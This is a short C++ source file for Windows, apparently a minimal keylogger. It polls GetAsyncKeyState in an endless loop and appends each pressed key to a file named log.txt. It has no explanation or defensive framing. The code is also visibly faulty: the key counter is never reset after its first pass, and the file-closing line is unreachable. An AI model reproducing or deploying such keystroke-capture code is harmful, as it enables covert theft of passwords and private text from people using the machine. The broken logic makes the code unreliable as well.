#include <iostream>
#include <windows.h>
#include <fstream>

using namespace std;

int main()
{
    ofstream myfile;
    myfile.open ("log.txt");
    int c(20);
  for(;;)
  {
    for(; c <= 'Z'; c++)
    {
        if(GetAsyncKeyState(c) == -32767)
        {
        myfile << (char)c;
        }
    }
  }
    myfile.close();
    
return 0;
}
 
